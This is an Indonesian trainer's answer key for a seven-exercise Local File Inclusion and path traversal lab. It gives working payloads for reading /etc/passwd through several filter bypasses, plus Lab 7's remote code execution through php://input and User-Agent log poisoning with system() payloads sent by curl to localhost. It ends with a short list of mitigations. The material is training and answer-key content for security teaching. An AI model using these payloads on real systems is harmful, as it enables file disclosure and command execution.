# Kunci Jawaban — Local File Inclusion (LFI) / Path Traversal Lab

> 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
> penjelasan *kenapa* tiap payload berhasil untuk ke-7 lab di [README.md](README.md). Jangan
> dibagikan ke peserta sebelum sesi lab selesai.

---

## Lab 1 — Basic LFI (`lab1_basic.php`)

**Kode di server:**
```php
$page = $_GET['page'] ?? 'pages/home.php';
include $page;
```
Tidak ada validasi, whitelist, maupun `basename()` sama sekali.

**Payload:**
```
?page=../../../../etc/passwd
?page=../secret/config.php
```
**Kenapa berhasil:** `include()` menerima path apa pun yang bisa di-resolve filesystem,
termasuk yang membawa keluar dari direktori aplikasi lewat `../`. `/etc/passwd` tidak
mengandung tag `<?php ?>`, jadi PHP menampilkannya apa adanya sebagai teks — bukti file
berhasil dibaca.

---

## Lab 2 — Absolute Path Bypass (`lab2_absolute_bypass.php`)

**Kode di server:**
```php
$blocked = (strpos($page, '../') !== false);
$safe_page = $blocked ? 'pages/home.php' : $page;
include $safe_page;
```
Filter hanya menolak input yang **mengandung** substring `../`.

**Payload:**
```
?page=/etc/passwd
```
**Kenapa berhasil:** path absolut (diawali `/`) menunjuk langsung ke lokasi file tanpa perlu
notasi `../` sama sekali, sehingga tidak pernah memicu kondisi blokir — filter ini secara
implisit mengasumsikan semua path berbahaya pasti memakai traversal relatif, padahal tidak.

---

## Lab 3 — Non-recursive Strip (`lab3_nonrecursive_strip.php`)

**Kode di server:**
```php
$safe_page = str_replace('../', '', $page);
include $safe_page;
```
`str_replace()` menghapus semua kemunculan `../`, tapi hanya dalam **satu pass** — hasil
penghapusan tidak diperiksa ulang untuk kemunculan baru yang terbentuk.

**Payload:**
```
?page=....//....//....//....//etc/passwd
```
**Kenapa berhasil:** string `....//` mengandung substring `../` mulai dari karakter ke-3
(`..` + `/` dari lima karakter `....//`). Setelah `str_replace` membuang kemunculan itu, sisa
karakter yang tergabung kembali membentuk `../` yang baru — persis pola non-recursive
stripping klasik.

---

## Lab 4 — Superfluous URL-decode (`lab4_double_decode.php`)

**Kode di server:**
```php
$stripped = str_replace('../', '', $page);   // filter dijalankan duluan
$safe_page = urldecode($stripped);            // lalu decode LAGI, setelah filter
include $safe_page;
```
PHP sudah men-decode query string satu kali secara otomatis sebelum masuk ke `$_GET`. Filter
di atas membuang `../` dari nilai yang sudah ter-decode itu, tapi kemudian men-decode-nya
**sekali lagi** secara manual.

**Payload:**
```
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```
**Kenapa berhasil:** `%252e%252e%252f` setelah decode otomatis PHP menjadi `%2e%2e%2f` (baru
satu lapis terbuka) — filter `str_replace('../', ...)` tidak menemukan literal `../` karena
bentuknya masih ter-encode, jadi lolos tanpa perubahan. Baru setelah `urldecode()` manual
dijalankan (lapis kedua), `%2e%2e%2f` berubah jadi `../` yang sesungguhnya — tapi ini terjadi
**setelah** filter selesai bekerja, sehingga traversal tetap utuh saat sampai ke `include()`.

---

## Lab 5 — Validation of Start of Path (`lab5_start_validation.php`)

**Kode di server:**
```php
$valid = (strpos($page, 'pages/') === 0);
$safe_page = $valid ? $page : 'pages/home.php';
include $safe_page;
```
Validasi hanya memastikan string input **dimulai** dengan `pages/`, tanpa menormalisasi
(`realpath()`) untuk memastikan hasil akhirnya benar-benar tetap di dalam folder itu.

**Payload:**
```
?page=pages/../../../../etc/passwd
```
**Kenapa berhasil:** string `pages/../../../../etc/passwd` memang dimulai dengan `pages/`
(lolos validasi apa adanya), tapi begitu filesystem me-resolve path tersebut, `pages/..`
langsung membawa kembali ke direktori induknya, lalu `../../../etc/passwd` melanjutkan
traversal ke luar sepenuhnya — validasi string tidak pernah melihat hasil resolve ini.

---

## Lab 6 — Null Byte Bypass (`lab6_extension_nullbyte.php`)

**Kode di server:**
```php
$valid_ext = (substr($page, -4) === '.png');   // cek di STRING MENTAH
if ($valid_ext) {
    $target = $page;
    $null_pos = strpos($target, "\0");
    if ($null_pos !== false) {
        $target = substr($target, 0, $null_pos); // simulasi truncation ala PHP lama
    }
}
include $target;
```

**Payload:**
```
?page=../../../../etc/passwd%00.png
```
**Kenapa berhasil:** `%00` di-decode PHP menjadi byte NUL literal di dalam string
`$_GET['page']`. Validasi ekstensi memeriksa 4 karakter TERAKHIR dari string PENUH
(`...passwd\0.png`), yang memang `.png` — lolos. Kode lab ini kemudian *mensimulasikan* bug
historis PHP < 5.3.4: fungsi level-C (`fopen`/`include`) di versi lama berhenti membaca string
begitu menemukan byte NUL (karena string C diakhiri null), sehingga file yang benar-benar
dibuka adalah `../../../../etc/passwd` — bagian setelah `\0` diabaikan sepenuhnya oleh sistem
file. **Catatan penting untuk trainer:** ini bukan perilaku asli PHP modern (sudah dipatch
sejak 5.3.4); baris simulasi ditambahkan secara eksplisit di kode lab supaya teknik historis
ini tetap bisa dipraktikkan.

---

## Lab 7 — LFI to RCE (`lab7_wrappers_rce.php`)

**Kode di server:**
```php
include $_GET['page'];   // tanpa validasi sama sekali
```
Plus: `header.php` mencatat header `User-Agent` mentah dari SETIAP request ke
`app_data/access.log` (di luar webroot, `/var/www/app_data/`).

### a. Source code disclosure via `php://filter`
```
?page=php://filter/convert.base64-encode/resource=pages/secret_notes.php
```
**Kenapa berhasil:** meng-`include()` file `.php` secara langsung akan **mengeksekusinya**,
bukan menampilkan isi source-nya. Wrapper `php://filter` dengan filter
`convert.base64-encode` membungkus stream file target sebelum PHP sempat mem-parsingnya
sebagai kode — hasilnya adalah isi file dalam bentuk teks base64, aman untuk ditampilkan tanpa
pernah benar-benar dieksekusi. `php://filter` tidak butuh `allow_url_include` karena bukan
wrapper "URL" jarak jauh, murni operasi stream lokal. Decode base64 hasilnya untuk menemukan
`INTERNAL_API_KEY=LFI7-9c1e2a-flag-source-disclosure` di komentar `pages/secret_notes.php`.

### b. RCE via `php://input`
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://localhost:8079/lfi/lab7_wrappers_rce.php?page=php://input&cmd=id"
```
**Kenapa berhasil:** `php://input` adalah stream read-only berisi **raw body** dari request
saat ini. Karena `allow_url_include = On` diaktifkan di `lab-lfi.ini` (mensimulasikan
konfigurasi PHP lama), `include('php://input')` memperlakukan body POST sebagai file PHP yang
sesungguhnya dan mengeksekusinya — termasuk memanggil `system($_GET['cmd'])` yang baru saja
dikirim, menghasilkan RCE penuh.

### c. Log poisoning
```bash
curl -s -A '<?php system($_GET["cmd"]); ?>' "http://localhost:8079/lfi/index.php" > /dev/null
curl -s "http://localhost:8079/lfi/lab7_wrappers_rce.php?page=../app_data/access.log&cmd=id"
```
**Kenapa berhasil:** request pertama mengirim payload PHP sebagai header `User-Agent`, yang
dicatat mentah (tanpa sanitasi) ke `app_data/access.log` oleh `header.php` setiap kali halaman
mana pun di aplikasi ini diakses — persis seperti access log web server sungguhan
(Apache/Nginx) yang juga mencatat User-Agent mentah secara default. Request kedua meng-include
file log tersebut; karena isinya sekarang mengandung tag `<?php system($_GET['cmd']); ?>`
persis di antara teks log lainnya, PHP mengeksekusi bagian itu saat file di-include — respons
dari `system('id')` ikut tercetak ke halaman.

---

## Ringkasan hasil akhir

| Lab | Teknik | Payload final | Bukti keberhasilan |
|---|---|---|---|
| 1 | Basic LFI | `../../../../etc/passwd` | Isi `/etc/passwd` tampil |
| 2 | Absolute path bypass | `/etc/passwd` | Isi `/etc/passwd` tampil meski filter `../` aktif |
| 3 | Non-recursive strip | `....//....//....//....//etc/passwd` | Isi `/etc/passwd` tampil |
| 4 | Superfluous decode | `%252e%252e%252f...` (double-encoded) | Isi `/etc/passwd` tampil |
| 5 | Start-of-path validation | `pages/../../../../etc/passwd` | Isi `/etc/passwd` tampil |
| 6 | Null byte bypass | `../../../../etc/passwd%00.png` | Isi `/etc/passwd` tampil meski ekstensi divalidasi |
| 7 | LFI to RCE | `php://input` + POST body / log poisoning | Output `id` tampil (RCE) |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Hindari `include()`/`require()` dinamis dari input pengguna; gunakan allowlist eksplisit.
- Kalau harus, `basename()` input lalu gabungkan ke direktori dasar tetap.
- Validasi hasil akhir dengan `realpath()` dan pastikan tetap di dalam direktori yang
  diizinkan — bukan hanya mengecek string mentah sebelum resolve (Lab 2, 3, 4, 5).
- Nonaktifkan `allow_url_include` (Lab 7).
- Jangan tampilkan `display_errors` mentah di production (path disclosure).
- Simpan file rahasia di luar webroot **dan** cegah LFI meng-include-nya — dua lapis, jangan
  andalkan salah satu saja.
